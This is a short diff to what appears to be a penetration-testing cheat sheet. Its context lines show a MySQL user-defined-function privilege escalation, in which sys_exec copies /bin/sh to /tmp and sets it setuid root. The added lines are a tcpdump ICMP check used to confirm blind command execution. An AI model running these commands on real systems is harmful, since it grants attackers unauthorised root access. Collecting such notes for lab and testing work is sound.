@@ -104,3 +104,8 @@ create function sys_exec returns int soname udf_filename;
 select * from mysql.func where name='sys_exec' \G
 select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
 ```
+
+## Ping check 
+```
+tcpdump -i tun0 icmp 
+```
